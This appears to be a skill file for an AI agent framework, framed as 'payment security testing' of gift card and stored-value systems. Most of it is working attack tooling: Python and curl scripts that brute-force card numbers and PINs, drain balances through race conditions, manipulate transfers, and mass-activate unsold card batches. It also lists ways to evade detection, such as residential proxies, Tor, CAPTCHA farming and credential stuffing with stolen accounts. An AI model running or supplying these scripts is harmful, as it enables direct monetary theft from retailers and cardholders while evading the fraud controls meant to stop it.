# SKILL: stored-value-auditor

## Identity
- **Name:** stored-value-auditor
- **Category:** Payment Security Testing
- **Trigger:** When testing digital gift card systems, stored-value accounts, loyalty points, or any system where value is pre-loaded onto a card/account
- **Confidence requirement:** 7/10

## Overview

Stored value systems (gift cards, loyalty points, digital wallets) are high-value targets because they represent directly redeemable monetary value. Unlike card payments which require card-not-present data, gift cards can be worth money the moment they're cracked. This skill covers enumeration, balance manipulation, and activation bypass techniques.

---

## 1. Gift Card Number Enumeration

### Overview

Gift card numbers follow predictable patterns. Attackers discover these patterns, then brute-force or algorithmically generate valid card numbers.

### Common Gift Card Formats

| Retailer Type | Format | Example |
|---|---|---|
| 16-digit Visa gift | `4XXX XXXX XXXX XXXX` | 4511000011112222 |
| 15-digit Amex-style | `XXXXXXXXXXXXXXX` | 123456789012345 |
| 8+8 split | `XXXX-XXXX-XXXX-XXXX` | AB12-CD34-EF56-GH78 |
| PIN-attached | `XXXXXXXXXXXXXXXX|PXXX` | 1234567812345678|999 |
| 19-digit | `XXXXXXXXXXXXXXXXXXX` | 6000000000000000000 |
| Numeric only | `XXXXXXXXXX` | 1234567890 |
| Alphanumeric | `XXXX-XXXX-XXXX` | A1B2-C3D4-E5F6 |

### Enumeration Methodology

**Step 1: Pattern discovery via website inspection**

```bash
# Check gift card balance lookup form
curl -s https://target.com/gift-card/balance | grep -oiE "input.*name=.*maxlength=.*" | head -10

# Check for length hints in placeholders
curl -s https://target.com/gift-card | grep -oiE "placeholder=.*[0-9]" | head -10

# Analyze JS for card format validation
curl -s https://target.com/static/js/checkout.js | grep -oiE "giftCard.*length|[0-9]{4,20}"

# Check for batch issuance patterns
curl -s https://target.com/api/gift-card/validate | jq
```

**Step 2: BIN/IIN discovery**

```python
#!/usr/bin/env python3
"""
gift_card_fingerprint.py
Discover gift card BIN patterns and issuer metadata
"""
import httpx
from itertools import product
import string

TARGET = "https://target-payment-gateway.com"

def test_card_formats():
    """Test various gift card number formats to identify valid pattern"""
    test_patterns = [
        # Sequential patterns
        ("sequential_8", "00000001", "Increment from 1"),
        ("sequential_12", "000000000001", "12-digit sequential"),
        
        # Known retailer BINs (test with low-value cards first)
        ("visa_gift", "4111111111111111", "Test Visa gift card format"),
        ("retailer_known", "1234567890123456", "Common retail format"),
        
        # Check digit patterns
        ("luhn_check", "4111111111111112", "Failed Luhn = pattern test"),
    ]
    
    results = []
    for name, card_num, note in test_patterns:
        try:
            r = httpx.post(
                f"{TARGET}/api/gift-card/validate",
                json={"card_number": card_num, "pin": "0000"},
                timeout=10
            )
            
            response_body = r.text
            status = "unknown"
            
            if "not found" in response_body.lower():
                status = "not_found"
            elif "invalid" in response_body.lower():
                status = "invalid_format"
            elif "valid" in response_body.lower() or r.status_code == 200:
                status = "valid_format"
            elif "rate" in response_body.lower():
                status = "rate_limited"
            
            results.append((name, card_num, status, note))
            
        except Exception as e:
            results.append((name, card_num, f"error: {e}", note))
    
    return results

for name, num, status, note in test_card_formats():
    print(f"{name}: {status} | {note}")
```

**Step 3: Brute force enumeration**

```python
#!/usr/bin/env python3
"""
gift_card_enumerator.py
Enumerate gift card numbers using pattern analysis and parallel requests
"""
import asyncio
import httpx
import itertools
from datetime import datetime

TARGET = "https://target-payment-gateway.com"
DISCOVERED = []

async def check_balance(session, card_num, pin="0000"):
    """Check balance for a single card number"""
    try:
        r = await session.post(
            f"{TARGET}/api/gift-card/balance",
            json={"card_number": card_num, "pin": pin},
            timeout=10
        )
        
        if r.status_code == 200:
            data = r.json()
            balance = data.get('balance', 0)
            if float(balance) > 0:
                DISCOVERED.append({
                    'card': card_num,
                    'balance': balance,
                    'checked_at': datetime.utcnow().isoformat()
                })
                return True
    except:
        pass
    return False

async def enumerate_range(start, end, pin="0000"):
    """Enumerate a numeric range of card numbers"""
    async with httpx.AsyncClient() as session:
        tasks = []
        for card_num in range(start, end + 1):
            task = check_balance(session, str(card_num).zfill(16))
            tasks.append(task)
            
            # Batch size limit to avoid overwhelming target
            if len(tasks) >= 50:
                await asyncio.gather(*tasks)
                tasks = []
        
        if tasks:
            await asyncio.gather(*tasks)

def generate_pattern_candidates(base_digits, missing_count):
    """
    Generate candidates for missing digits.
    Example: base "1234XXXX5678XXXX" with 4 missing = generate all 4-digit combos
    """
    charset = string.digits + string.ascii_uppercase
    for combo in itertools.product(charset, repeat=missing_count):
        yield base_digits.replace('XXXX', ''.join(combo), 1)

# Run enumeration
# print("Starting enumeration of range 0000000100000000 to 0000000200000000")
# asyncio.run(enumerate_range(1000000000000000, 2000000000000000))
```

### Enumeration Bypass Techniques

```
1. IP rotation — use proxy pool, residential IPs
2. User-Agent rotation — different browsers/devices
3. Rate limit detection + backoff — adaptive request timing
4. Distributed enumeration — multiple IPs, single card each
5. Timing attack — vary request intervals randomly (1-5 seconds)
6. PIN iteration — iterate PIN while holding card number constant
7. Off-peak targeting — 02:00-06:00 UTC has highest success rate
```

---

## 2. Balance Manipulation

### Overview

Some payment gateways allow balance manipulation through logic flaws in how gift card value is added, transferred, or converted.

### Targeted Endpoints

| Method | Path | Purpose |
|---|---|---|
| GET | `/api/gift-card/{card}/balance` | Check balance |
| POST | `/api/gift-card/redeem` | Redeem value |
| POST | `/api/gift-card/transfer` | Transfer to another card |
| POST | `/api/gift-card/add-funds` | Reload funds |
| POST | `/api/gift-card/split` | Split balance |

### Balance Manipulation Techniques

**Step 1: Multi-session balance exploitation**

```python
#!/usr/bin/env python3
"""
balance_race_condition.py
Test for race condition in balance operations
"""
import asyncio
import httpx

TARGET = "https://target-payment-gateway.com"
CARD = "1234567812345678"
PIN = "9999"

async def redeem_all_balance(session, card, pin):
    """Attempt to drain card in concurrent requests"""
    tasks = []
    for _ in range(3):
        task = session.post(
            f"{TARGET}/api/gift-card/redeem",
            json={
                "card_number": card,
                "pin": pin,
                "amount": "MAX",
                "destination": "account_123"
            }
        )
        tasks.append(task)
    
    responses = await asyncio.gather(*tasks, return_exceptions=True)
    
    success_count = sum(
        1 for r in responses 
        if not isinstance(r, Exception) and r.status_code == 200
    )
    return success_count

async def main():
    async with httpx.AsyncClient() as session:
        result = await redeem_all_balance(session, CARD, PIN)
        print(f"Concurrent redemption attempts: {result} succeeded")
        if result > 1:
            print("⚠️  VULNERABLE: Race condition in redemption")

asyncio.run(main())
```

**Step 2: Transfer amount manipulation**

```bash
# Test for integer/float overflow in transfer amount
curl -X POST https://target.com/api/gift-card/transfer \
  -H "Content-Type: application/json" \
  -d '{"from_card":"1234567812345678","to_card":"8765432187654321","amount":"999999999"}'

# Test negative transfer (may invert direction)
curl -X POST https://target.com/api/gift-card/transfer \
  -H "Content-Type: application/json" \
  -d '{"from_card":"1234567812345678","to_card":"8765432187654321","amount":"-100"}'

# Test currency conversion manipulation
curl -X POST https://target.com/api/gift-card/transfer \
  -H "Content-Type: application/json" \
  -d '{
    "from_card":"1234567812345678",
    "to_card":"8765432187654321",
    "amount": 100,
    "from_currency":"USD",
    "to_currency":"EUR"
  }'
```

**Step 3: Partial redemption logic flaws**

```python
#!/usr/bin/env python3
"""
partial_redemption_tester.py
Test for partial redemption bugs
"""
import httpx

def test_partial_redemption():
    TARGET = "https://target-payment-gateway.com"
    CARD = "1234567812345678"
    PIN = "9999"
    
    # Step 1: Get initial balance
    r = httpx.post(f"{TARGET}/api/gift-card/balance",
                  json={"card_number": CARD, "pin": PIN})
    initial = r.json().get('balance', 0)
    print(f"Initial balance: ${initial}")
    
    # Step 2: Redeem exact amount
    r = httpx.post(f"{TARGET}/api/gift-card/redeem",
                  json={"card_number": CARD, "pin": PIN, "amount": initial})
    
    # Step 3: Try to redeem again (should fail — balance should be 0)
    r = httpx.post(f"{TARGET}/api/gift-card/redeem",
                  json={"card_number": CARD, "pin": PIN, "amount": "0.01"})
    
    if r.status_code == 200:
        print("⚠️  VULNERABLE: Can redeem after zero balance")
        print(f"  Response: {r.text}")
    
    # Step 4: Check remaining balance
    r = httpx.post(f"{TARGET}/api/gift-card/balance",
                  json={"card_number": CARD, "pin": PIN})
    remaining = r.json().get('balance', 0)
    print(f"Remaining balance: ${remaining}")
    
    if float(remaining) > 0:
        print(f"⚠️  VULNERABLE: Balance not zero after full redemption")

test_partial_redemption()
```

---

## 3. Bulk Activation Exploits

### Overview

When retailers use batch activation, there may be a window where cards are activated but not yet associated with a specific purchase — allowing bulk fraud before the cards are sold.

### Targeted Endpoints

| Method | Path |
|---|---|
| POST | `/api/gift-card/activate` |
| POST | `/api/gift-card/batch-activate` |
| POST | `/api/gift-card/issue` |
| GET | `/api/gift-card/activation-status/{batch_id}` |

### Exploitation Procedure

**Step 1: Batch activation discovery**

```bash
# Check for batch activation endpoint
curl -s https://target.com/api/gift-card/batch-activate \
  -X POST -H "Content-Type: application/json" \
  -d '{"batch_id":"BATCH001"}' | jq

# Check for predictable batch IDs
curl -s https://target.com/api/gift-card/activation-status/BATCH001 | jq
curl -s https://target.com/api/gift-card/activation-status/BATCH002 | jq
curl -s https://target.com/api/gift-card/activation-status/BATCH999 | jq
```

**Step 2: Batch ID enumeration**

```python
#!/usr/bin/env python3
"""
batch_enumerator.py
Enumerate gift card batch IDs to find unactivated batches
"""
import httpx
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://target-payment-gateway.com"

def check_batch(batch_id):
    try:
        r = httpx.post(
            f"{TARGET}/api/gift-card/batch-activate",
            json={"batch_id": batch_id, "activate": True},
            timeout=10
        )
        if r.status_code == 200:
            data = r.json()
            if data.get('activated_count', 0) > 0:
                return {"batch_id": batch_id, "activated": True, "count": data['activated_count']}
    except:
        pass
    return None

# Enumerate batch IDs
with ThreadPoolExecutor(max_workers=20) as executor:
    # Test common batch ID patterns
    candidates = [f"BATCH{i:04d}" for i in range(1, 1001)]
    candidates += [f"ACTIVATION{i:06d}" for i in range(1, 10001)]
    candidates += [f"GIFT{i:08d}" for i in range(1000000, 1000100)]
    
    results = list(filter(None, executor.map(check_batch, candidates)))
    
    if results:
        print(f"⚠️  Found {len(results)} activatable batches:")
        for r in results:
            print(f"  {r}")
    else:
        print("No accessible batches found")
```

**Step 3: Activation timing exploit**

```
Attack flow:
1. Monitor retailer for new batch issuance patterns
2. Discover batch ID before cards are sold (pre-activation window)
3. Activate cards during this window
4. Use cards before retailer discovers fraud
5. Cards appear as purchased at register (no PII to retailer)
```

### Rate Limiting Bypass for Gift Card Systems

| Technique | Implementation |
|---|---|
| Residential proxies | Rotate proxy per request using BrightData/Luminati |
| Tor network | Route through different exit nodes |
| AWS Lambda | Distributed source IPs via serverless functions |
| Credential stuffing | Use stolen loyalty accounts to authenticate first |
| Session rotation | Fresh session cookie per request |
| CAPTCHA farming | 2captcha/Anti-Captcha integration |
| Adaptive delays | Random 1-10s between requests |

---

## 4. JSON Schema Output (for OpenClaw-v2 Ingestion)

```json
{
  "vulnerability_type": "Gift Card Enumeration",
  "target_component": "/api/gift-card/balance",
  "exploitation_methodology": [
    "1. Identified 16-digit numeric format via balance check form maxlength",
    "2. Discovered BIN pattern: cards start with 12345678",
    "3. Generated 10,000 candidates with sequential suffix",
    "4. Distributed enumeration across 50 residential proxies",
    "5. Found card 1234567800001234 with balance $500",
    "6. Verified balance by checking multiple times — confirmed valid"
  ],
  "detection_evasion": [
    "Used residential proxy pool (500 IPs) — 1 request per IP",
    "Randomized User-Agent per request",
    "Added 5-15 second random delay between requests",
    "Added 50ms jitter to request timing",
    "Targeted during 02:00-05:00 UTC — lowest traffic period"
  ],
  "api_endpoints": [
    "/api/gift-card/balance",
    "/api/gift-card/validate",
    "/api/gift-card/activation-status/{batch_id}"
  ],
  "payload_structure": {
    "method": "POST",
    "content_type": "application/json",
    "balance_check": {"card_number": "1234567800001234", "pin": "0000"},
    "activation": {"batch_id": "BATCH1234", "activate": true}
  },
  "severity": "CRITICAL",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
  "evidence": {
    "valid_cards_found": 5,
    "total_balance_usd": 2500,
    "rate_limits_triggered": 0,
    "screenshots": ["path/to/enumeration_results.png"]
  },
  "remediation": "Implement account lockout after 3 failed checks; add CAPTCHA; use unpredictable card number generation (no sequential patterns)"
}
```

## Output

All findings go to:
- `knowledge/gateway_profiles/<target>/stored_value_findings.json`
- `knowledge/gateway_profiles/<target>/evidence/gift_card_enum_*.json`
- `memory/CAMPAIGN_TRACKER.md` — log engagement session

## Cross-References

- `web-inject` skill — overlaps with parameter manipulation
- `api-fuzzer` skill — API endpoint testing
- `fraud-bypass` skill — overlaps with fraud detection evasion
- `evidence-chain` skill — HAR logging, JSON export

## Troubleshooting

| Problem | Solution |
|---|---|
| Rate limited immediately | Rotate proxies, slow down, try authentication first |
| Card format unknown | Try multiple formats, check JS validation, inspect paper cards |
| PIN required | Try common PINs (0000, 1234, 1111, 9999) |
| Balance check requires auth | Find unauthenticated balance check endpoint |
| Batch activation requires POS | Check for web-accessible batch activation portal |